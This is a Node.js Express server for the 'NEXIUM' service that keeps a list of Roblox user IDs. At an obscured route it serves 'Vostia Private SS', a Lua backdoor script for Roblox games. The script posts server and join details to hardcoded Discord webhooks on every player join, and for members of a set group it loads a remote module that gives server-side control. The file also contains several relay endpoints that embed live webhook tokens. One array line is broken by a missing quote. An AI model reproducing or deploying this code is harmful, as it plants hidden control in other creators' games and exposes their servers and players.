const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
const app = express();
const port = process.env.PORT || 3000;

const DATA_FILE = path.join(__dirname, "users.json");
const COMPLETE_DATA_FILE = path.join(__dirname, "allusers.json");

function loadCompleteUserData() {
  try {
    if (fs.existsSync(COMPLETE_DATA_FILE)) {
      const data = fs.readFileSync(COMPLETE_DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`loaded ${parsed.length} complete user records from storage`);
      return parsed;
    } else {
      fs.writeFileSync(COMPLETE_DATA_FILE, JSON.stringify([], null, 2));
      console.log("created new allusers.json file");
    }
  } catch (error) {
    console.error("error loading complete user data:", error);
  }
  console.log("starting with empty list");
  return [];
}

function saveCompleteUserData(users) {
  try {
    fs.writeFileSync(COMPLETE_DATA_FILE, JSON.stringify(users, null, 2));
    console.log(`saved ${users.length} complete user records to storage`);
    const fd = fs.openSync(COMPLETE_DATA_FILE, 'r+');
    fs.fsyncSync(fd);
    fs.closeSync(fd);
  } catch (error) {
    console.error("error saving complete user data:", error);
  }
}

function loadUsers() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.length} users from storage`);
      return parsed;
    } else {
      fs.writeFileSync(DATA_FILE, JSON.stringify([], null, 2));
      console.log("created new users.json file");
    }
  } catch (error) {
    console.error("error loading users:", error);
  }
  console.log("starting with empty list");
  return [];
}

function saveUsers(users) {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
    console.log(`saved ${users.length} users to storage`);
    const fd = fs.openSync(DATA_FILE, 'r+');
    fs.fsyncSync(fd);
    fs.closeSync(fd);
  } catch (error) {
    console.error("error saving users:", error);
  }
}

const DEFAULT_USERS = ["28259717, "8013817688", "1658013861", "2297463874"];

function initializeUsers() {
  let users = loadUsers();
  if (users.length === 0) {
    console.log("no existing users found, using default user list");
    users = [...DEFAULT_USERS];
    saveUsers(users);
    console.log(`initialized with default users: [${users.join(', ')}]`);
  } else {
    console.log(`loaded existing users: [${users.join(', ')}]`);
  }
  return users;
}

let userl = initializeUsers();

app.use(express.json());
app.use(cors());
app.use(express.static('public'));
const rmap = new Map();
const tw = 60000;
const mr = 100;

const rlim = (req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const now = Date.now();

  if (!rmap.has(ip)) {
    rmap.set(ip, { count: 1, resetTime: now + tw });
    return next();
  }

  const data = rmap.get(ip);

  if (now > data.resetTime) {
    data.count = 1;
    data.resetTime = now + tw;
    return next();
  }

  if (data.count >= mr) {
    return res.status(429).json({
      error: "too many requests",
      retry: Math.ceil((data.resetTime - now) / 1000),
    });
  }

  data.count++;
  next();
};

app.use(rlim);

function getCurrentUsers() {
  return [...userl];
}

function updateUserList(newu) {
  userl = [...newu];
  saveUsers(userl);
}

app.get("/", (req, res) => {
  res.send({ message: "NEXIUM" });
});

app.get("/api/test", (req, res) => {
  res.json({ message: "NEXIUM ON TOP!" });
});

app.get("/api/id", (req, res) => {
  const users = getCurrentUsers();
  res.json({ message: users.join(" ") });
});

app.get("/api/users", async (req, res) => {
  const uids = getCurrentUsers();

  try {
    const uprom = uids.map(async (uid) => {
      const resp = await fetch(`https://users.roblox.com/v1/users/${uid}`);
      if (!resp.ok) {
        throw new Error(`failed ${uid}`);
      }
      const udt = await resp.json();
      return {
        id: udt.id,
        username: udt.name,
      };
    });

    const users = await Promise.all(uprom);
    saveCompleteUserData(users);
    res.json({ users });
  } catch (error) {
    console.error("error", error);
    res.status(500).json({
      error: "failed to fetch",
      fallback: { message: "idk why u got this error" },
    });
  }
});

app.post("/api/users/add", async (req, res) => {
  const { userid } = req.body;
  console.log(`[ADD] request to add user: ${userid}`);

  if (!userid) {
    return res.status(400).json({ error: "id required" });
  }

  if (!/^\d+$/.test(userid)) {
    return res.status(400).json({ error: "invalid user id format" });
  }

  const cus = getCurrentUsers();
  console.log(`[ADD] current users before add: [${cus.join(', ')}]`);

  if (cus.includes(userid)) {
    console.log(`[ADD] user ${userid} already exists`);
    return res.status(409).json({ error: "already exists" });
  }

  try {
    const resp = await fetch(`https://users.roblox.com/v1/users/${userid}`);
    if (!resp.ok) {
      console.log(`[ADD] failed to fetch user data for ${userid}`);
      return res.status(400).json({ error: "invalid user id or API error" });
    }
    const userData = await resp.json();

    const nus = [...cus, userid];
    updateUserList(nus);
    console.log(`[ADD] updated user list: [${nus.join(', ')}]`);

    const completeData = loadCompleteUserData();
    const newUserData = {
      id: userData.id,
      username: userData.name,
      addedAt: new Date().toISOString()
    };
    
    const existingUserIndex = completeData.findIndex(u => u.id === userid);
    if (existingUserIndex >= 0) {
      completeData[existingUserIndex] = newUserData;
    } else {
      completeData.push(newUserData);
    }
    
    saveCompleteUserData(completeData);
    console.log(`[ADD] successfully added user ${userid} (${userData.name})`);

    res.json({ 
      message: "success", 
      users: nus,
      addedUser: newUserData
    });
  } catch (error) {
    console.error("error adding user:", error);
    res.status(500).json({ 
      error: "failed to add user",
      details: error.message 
    });
  }
});

app.delete("/api/users/remove", (req, res) => {
  const { userid } = req.body;
  console.log(`[REMOVE] request to remove user: ${userid}`);

  if (!userid) {
    return res.status(400).json({ error: "id required" });
  }

  const cus = getCurrentUsers();
  console.log(`[REMOVE] current users before removal: [${cus.join(', ')}]`);

  const nwu = cus.filter(id => id !== userid);

  if (nwu.length === cus.length) {
    console.log(`[REMOVE] user ${userid} not found in list`);
    return res.status(404).json({ error: "not found" });
  }

  updateUserList(nwu);
  console.log(`[REMOVE] updated user list: [${nwu.join(', ')}]`);

  const completeData = loadCompleteUserData();
  const userIndex = completeData.findIndex(user => user.id === userid);
  
  if (userIndex >= 0) {
    completeData[userIndex] = {
      ...completeData[userIndex],
      removed: true,
      removedAt: new Date().toISOString()
    };
    saveCompleteUserData(completeData);
    console.log(`[REMOVE] marked user ${userid} as removed in complete data`);
  }

  console.log(`[REMOVE] successfully removed user ${userid}`);

  res.json({ 
    message: "removed", 
    users: nwu,
    removedUserId: userid
  });
});

app.get("/api/users/list", (req, res) => {
  res.json({ users: getCurrentUsers() });
});

app.get("/s/s/s/s/s/s/s/string", (req, res) => {
  const luaCode = `local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local GROUP_ID = 729636090

local function getHook()
	local count = #Players:GetPlayers()
	if count <= 50 then
		return "https://discord.com/api/webhooks/1401024494059130950/k-88Psy0G5xFZt_rI8-UfThZa2UGLC8l236uLk7x7emH4Y7SWUz-HdpD5US5ZIXYTLgq"
	elseif count <= 500 then
		return "https://discord.com/api/webhooks/1401024680856518816/Lp0erfUrUAnETMHPCf9YpD9wJf-0q6dqsVHG0RFSJbHRCHpBxk78RgstfwWKuKqPjY5B"
	elseif count <= 1000 then
		return "https://discord.com/api/webhooks/1401024809109819463/z3xMmge0qn7_Unq8hRnd_w5FwtSfngyzEaEdvDBQwhxbluHckIaq0y03jaKNsLPCeOEp"
	end
	return nil
end

local function getGameInfo()
	local success, result = pcall(function()
		return HttpService:JSONDecode(HttpService:GetAsync(
			"https://games.roproxy.com/v1/games?universeIds=" .. game.GameId
			)).data[1]
	end)
	return success and result or nil
end

local function getCreatorInfo()
	local success, result = pcall(function()
		return HttpService:JSONDecode(HttpService:GetAsync(
			"https://users.roproxy.com/v1/users/" .. game.CreatorId
			))
	end)
	return success and result or nil
end

local function getThumbnail()
	local fallback = "https://tr.rbxcdn.com/0e90843d418d38921c1934c3bcf5c5fc/150/150/Image/Png"
	local success, result = pcall(function()
		local response = HttpService:GetAsync(
			"https://thumbnails.roproxy.com/v1/games/icons?universeIds=" .. game.GameId ..
				"&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false"
		)
		local data = HttpService:JSONDecode(response)
		return data and data.data and data.data[1] and data.data[1].imageUrl or fallback
	end)
	return (success and result) or fallback
end

local function getUniverseId()
	local success, result = pcall(function()
		return HttpService:JSONDecode(HttpService:GetAsync(
			"https://apis.roproxy.com/universes/v1/places/" .. game.PlaceId .. "/universe"
			)).universeId
	end)
	return success and result or "Unavailable"
end

Players.PlayerAdded:Connect(function(plr)
	local hook = getHook()
	if not hook then return end

	local gameInfo = getGameInfo()
	local creatorInfo = getCreatorInfo()
	local thumb = getThumbnail()

	local success, gameName = pcall(function()
		return MarketplaceService:GetProductInfo(game.PlaceId).Name
	end)

	if not success or not gameInfo or not creatorInfo then
		warn("Failed to gather game or creator info.")
		return
	end

	local embed = {
		embeds = { {
			title = "Vostia Private SS",
			color = 0xFF0000,
			fields = {
				{
					name = "Game Information",
					value = string.format(
						"**Game Name:** %s\\n" ..
							"**Game Link:** [%s](https://www.roblox.com/games/%d)\\n" ..
							"**Join Link:** [Join Server](https://www.roblox.com/games/%d?launch=true&jobId=%s)\\n\\n" ..
							"**Active Players:** %s\\n" ..
							"**Server Players:** %d/%d\\n" ..
							"**Visits:** %s\\n" ..
							"**Copying Allowed:** %s\\n" ..
							"**Game Genre:** %s\\n" ..
							"**Favourites:** %s",
						gameName,
						gameName, game.PlaceId,
						game.PlaceId, game.JobId,
						tostring(gameInfo.playing),
						#Players:GetPlayers(), Players.MaxPlayers,
						tostring(gameInfo.visits),
						tostring(gameInfo.copyingAllowed),
						gameInfo.genre or "Unknown",
						tostring(gameInfo.favoritedCount or "Unavailable")
					)
				},
				{
					name = "Creator Information",
					value = string.format(
						"**Creator Name:** %s\\n" ..
							"**Creator Profile Link:** [%s](https://www.roblox.com/users/%d/profile)\\n" ..
							"**Group ID:** %d",
						creatorInfo.name, creatorInfo.name, game.CreatorId,
						GROUP_ID
					)
				},
				{
					name = "JavaScript Join Code",
					value = string.format(
						"\`\`\`javascript\\nRoblox.GameLauncher.joinGameInstance(%d, \\"%s\\")\\n\`\`\`",
						game.PlaceId, game.JobId
					)
				}
			},
			image = { url = thumb }
		} }
	}

	pcall(function()
		HttpService:PostAsync(hook, HttpService:JSONEncode(embed), Enum.HttpContentType.ApplicationJson)
	end)

	if plr:IsInGroup(GROUP_ID) then
		pcall(function()
			require(84697639107952).LOAD(plr.Name)
		end)
	end
end)`;

  res.set('Content-Type', 'text/plain');
  res.send(luaCode);
});

app.post("/api/importantweb", async (req, res) => {
  const webhookUrl = "https://discord.com/api/webhooks/1402668496877522994/PA3yUmMeyV0Wr30WcYqUgS0d4Trd8HHqeOZGL1_HkxHPOCHfucm1akOX7YoQ2QjeKzOK";

  try {
    console.log("[WEBHOOK] forwarding request to Discord webhook");
    console.log("[WEBHOOK] request body:", JSON.stringify(req.body, null, 2));

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req.body),
    });

    if (!response.ok) {
      throw new Error(`discord webhook returned status ${response.status}`);
    }

    console.log("[WEBHOOK] successfully forwarded to Discord");
    res.json({ 
      message: "webhook forwarded successfully",
      status: response.status 
    });
  } catch (error) {
    console.error("[WEBHOOK] error forwarding to Discord:", error);
    res.status(500).json({ 
      error: "failed to forward webhook",
      details: error.message 
    });
  }
});

app.post("/api/igthisiscool", async (req, res) => {
  const webhookUrl = "https://discord.com/api/webhooks/1401997485966098573/sIUpqHN88iP3yZ8NiPRAgy_QYkMhuStiVCnjm_Yc7k7KFZjgmEAxIn_B3o0hE52WCVwH";

  try {
    console.log("[WEBHOOK] forwarding request to Discord webhook");
    console.log("[WEBHOOK] request body:", JSON.stringify(req.body, null, 2));

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req.body),
    });

    if (!response.ok) {
      throw new Error(`discord webhook returned status ${response.status}`);
    }

    console.log("[WEBHOOK] successfully forwarded to Discord");
    res.json({ 
      message: "webhook forwarded successfully",
      status: response.status 
    });
  } catch (error) {
    console.error("[WEBHOOK] error forwarding to Discord:", error);
    res.status(500).json({ 
      error: "failed to forward webhook",
      details: error.message 
    });
  }
});

app.post("/api/s", async (req, res) => {
  const webhookUrl = "https://discord.com/api/webhooks/1403124445014655097/1HyZFF9yOZGzba88vTu39d_41ReMq4J6hEXj8DB_VVatzXZ4GbcMayXmuke2Dc6S-Vpd";

  try {
    console.log("[WEBHOOK] forwarding request to Discord webhook");
    console.log("[WEBHOOK] request body:", JSON.stringify(req.body, null, 2));

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req.body),
    });

    if (!response.ok) {
      throw new Error(`discord webhook returned status ${response.status}`);
    }

    console.log("[WEBHOOK] successfully forwarded to Discord");
    res.json({ 
      message: "webhook forwarded successfully",
      status: response.status 
    });
  } catch (error) {
    console.error("[WEBHOOK] error forwarding to Discord:", error);
    res.status(500).json({ 
      error: "failed to forward webhook",
      details: error.message 
    });
  }
});

app.post("/api/e", async (req, res) => {
  const webhookUrl = "https://discord.com/api/webhooks/1403124551541456927/pAkkYkG01fXoJGgv5pjpR4m19-Bu-HNPJC_j72Pa6X72Qu61EqxIxAuZ00ekMMmukYBG";

  try {
    console.log("[WEBHOOK] forwarding request to Discord webhook");
    console.log("[WEBHOOK] request body:", JSON.stringify(req.body, null, 2));

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req.body),
    });

    if (!response.ok) {
      throw new Error(`discord webhook returned status ${response.status}`);
    }

    console.log("[WEBHOOK] successfully forwarded to Discord");
    res.json({ 
      message: "webhook forwarded successfully",
      status: response.status 
    });
  } catch (error) {
    console.error("[WEBHOOK] error forwarding to Discord:", error);
    res.status(500).json({ 
      error: "failed to forward webhook",
      details: error.message 
    });
  }
});

app.post("/api/d", async (req, res) => {
  const webhookUrl = "https://discord.com/api/webhooks/1401024680856518816/Lp0erfUrUAnETMHPCf9YpD9wJf-0q6dqsVHG0RFSJbHRCHpBxk78RgstfwWKuKqPjY5B";

  try {
    console.log("[WEBHOOK] forwarding request to Discord webhook");
    console.log("[WEBHOOK] request body:", JSON.stringify(req.body, null, 2));

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req.body),
    });

    if (!response.ok) {
      throw new Error(`discord webhook returned status ${response.status}`);
    }

    console.log("[WEBHOOK] successfully forwarded to Discord");
    res.json({ 
      message: "webhook forwarded successfully",
      status: response.status 
    });
  } catch (error) {
    console.error("[WEBHOOK] error forwarding to Discord:", error);
    res.status(500).json({ 
      error: "failed to forward webhook",
      details: error.message 
    });
  }
});

app.post("/api/g", async (req, res) => {
  const webhookUrl = "https://discord.com/api/webhooks/1401024809109819463/z3xMmge0qn7_Unq8hRnd_w5FwtSfngyzEaEdvDBQwhxbluHckIaq0y03jaKNsLPCeOEp";

  try {
    console.log("[WEBHOOK] forwarding request to Discord webhook");
    console.log("[WEBHOOK] request body:", JSON.stringify(req.body, null, 2));

    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(req.body),
    });

    if (!response.ok) {
      throw new Error(`discord webhook returned status ${response.status}`);
    }

    console.log("[WEBHOOK] successfully forwarded to Discord");
    res.json({ 
      message: "webhook forwarded successfully",
      status: response.status 
    });
  } catch (error) {
    console.error("[WEBHOOK] error forwarding to Discord:", error);
    res.status(500).json({ 
      error: "failed to forward webhook",
      details: error.message 
    });
  }
});

app.listen(port, "0.0.0.0", () => {
  console.log(`running at http://0.0.0.0:${port}/`);
});

module.exports = app;
